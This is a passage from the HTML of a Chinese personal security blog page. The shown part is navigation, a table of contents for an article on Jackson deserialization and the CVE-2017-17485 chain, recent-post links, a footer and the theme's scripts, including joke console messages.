  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">stoocea</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2024/03/08/65ea7ca64ea9f.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/FastJsonRe0.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">FastJsonRe0</div></div></a></div><div class="next-post pull-right"><a href="/post/C3P0%E9%93%BE%E5%88%86%E6%9E%90.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">C3P0攻击链学习</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/03/08/65ea7ca64ea9f.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2021/01/15/d24ffd2267904.png" alt="status"/></div></div><div class="author-info__description">time thicking away</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Jackson-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">Jackson 基本使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E6%A0%B8%E5%BF%83%E6%A8%A1%E5%9D%97%E6%B5%85%E5%B0%9D"><span class="toc-number">1.1.</span> <span class="toc-text">0x00 核心模块浅尝</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">1.2.</span> <span class="toc-text">0x01 环境准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E7%BB%84%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">0x02 组件分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1x01-ObjectMapper"><span class="toc-number">1.3.1.</span> <span class="toc-text">1x01 ObjectMapper</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2x01-%E5%B0%86-json-%E8%BD%AC%E5%8C%96%E4%B8%BA%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">2x01 将 json 转化为对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2x02-%E5%B0%86%E5%AF%B9%E8%B1%A1%E8%BD%AC%E5%8C%96%E4%B8%BA-json"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">2x02 将对象转化为 json</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1x02-JsonParser"><span class="toc-number">1.3.2.</span> <span class="toc-text">1x02 JsonParser</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1x03-JsonGenerator"><span class="toc-number">1.3.3.</span> <span class="toc-text">1x03 JsonGenerator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1x04-%E5%A4%9A%E6%80%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E2%80%93-JacksonPolymorphicDeserialization"><span class="toc-number">1.3.4.</span> <span class="toc-text">1x04 多态问题解决– JacksonPolymorphicDeserialization</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2x01-DefaultTyping"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">2x01 DefaultTyping</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3x01-JAVA-LANG-OBJECT"><span class="toc-number">1.3.4.1.1.</span> <span class="toc-text">3x01 JAVA_LANG_OBJECT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3x02-OBJECT-AND-NON-CONCRETE"><span class="toc-number">1.3.4.1.2.</span> <span class="toc-text">3x02 OBJECT_AND_NON_CONCRETE</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3x03-NON-CONCRETE-AND-ARRAYS"><span class="toc-number">1.3.4.1.3.</span> <span class="toc-text">3x03 NON_CONCRETE_AND_ARRAYS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3x04-NON-FINAL"><span class="toc-number">1.3.4.1.4.</span> <span class="toc-text">3x04 NON_FINAL</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2x02-JsonTypeInfo%E6%B3%A8%E8%A7%A3"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">2x02 @JsonTypeInfo注解</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3x01-JsonTypeInfo-Id-NONE"><span class="toc-number">1.3.4.2.1.</span> <span class="toc-text">3x01 JsonTypeInfo.Id.NONE</span></a></li><li class="toc-item toc-level-5"><a class="toc-link"><span class="toc-number">1.3.4.2.2.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3x02-JsonTypeInfo-Id-CLASS"><span class="toc-number">1.3.4.2.3.</span> <span class="toc-text">3x02 JsonTypeInfo.Id.CLASS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#-1"><span class="toc-number">1.3.4.2.4.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3x03-JsonTypeInfo-Id-NAME"><span class="toc-number">1.3.4.2.5.</span> <span class="toc-text">3x03 JsonTypeInfo.Id.NAME</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3x04-JsonTypeInfo-Id-CUSTOM"><span class="toc-number">1.3.4.2.6.</span> <span class="toc-text">3x04 JsonTypeInfo.Id.CUSTOM</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3x05-JsonTypeInfo-Id-MINIMAL-CLASS"><span class="toc-number">1.3.4.2.7.</span> <span class="toc-text">3x05  JsonTypeInfo.Id.MINIMAL_CLASS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1x05-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%B1%BB%E5%B1%9E%E6%80%A7%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="toc-number">1.3.5.</span> <span class="toc-text">1x05 反序列化中类属性方法调用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2x01-enableDefaultTyping"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">2x01 enableDefaultTyping</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2x02-JsonTypeInfo-Id-CLASS"><span class="toc-number">1.3.5.2.</span> <span class="toc-text">2x02 JsonTypeInfo.Id.CLASS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">0x03 工作流程分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1x00-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.4.1.</span> <span class="toc-text">1x00 环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1x01-BeanDeserialzer%E2%80%93%E7%B1%BB%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C-set-%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="toc-number">1.4.2.</span> <span class="toc-text">1x01 BeanDeserialzer–类的构造和 set 方法调用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90"><span class="toc-number">1.5.</span> <span class="toc-text">0x04 jackson 反序列化漏洞解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1x01-%E5%89%8D%E7%BD%AE%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.5.1.</span> <span class="toc-text">1x01 前置条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1x02-CVE-2017-17485-ClassPathXmlApplicationContext%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.5.2.</span> <span class="toc-text">1x02  CVE-2017-17485  ClassPathXmlApplicationContext利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2x01-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">2x01 影响版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">2x02 环境搭建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2x03-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">2x03 流程分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3x01-objectMapper%E2%80%93%E5%88%9D%E6%AD%A5%E5%A4%84%E7%90%86%E8%A7%A3%E6%9E%90"><span class="toc-number">1.5.2.3.1.</span> <span class="toc-text">3x01 objectMapper–初步处理解析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3x02-CPX-%E6%9C%89%E5%8F%82%E6%9E%84%E9%80%A0%E8%A7%A6%E5%8F%91"><span class="toc-number">1.5.2.3.2.</span> <span class="toc-text">3x02 CPX 有参构造触发</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/Re_Live.html" title="Re_Life">Re_Life</a><time datetime="2024-03-31T15:59:00.000Z" title="发表于 2024-03-31 23:59:00">2024-03-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html" title="ROME攻击链分析">ROME攻击链分析</a><time datetime="2024-03-31T15:50:00.000Z" title="发表于 2024-03-31 23:50:00">2024-03-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/C3P0%E9%93%BE%E5%88%86%E6%9E%90.html" title="C3P0攻击链学习">C3P0攻击链学习</a><time datetime="2024-03-22T07:00:00.000Z" title="发表于 2024-03-22 15:00:00">2024-03-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html" title="Jackson反序列化初步学习">Jackson反序列化初步学习</a><time datetime="2024-03-18T09:01:00.000Z" title="发表于 2024-03-18 17:01:00">2024-03-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/FastJsonRe0.html" title="FastJsonRe0">FastJsonRe0</a><time datetime="2024-03-18T09:00:00.000Z" title="发表于 2024-03-18 17:00:00">2024-03-18</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="stoocea" target="_blank">stoocea</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">0</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><span class="sidebar-menu-item-title">标签</span></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("03/01/2024 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 stoocea 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="java"></div><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>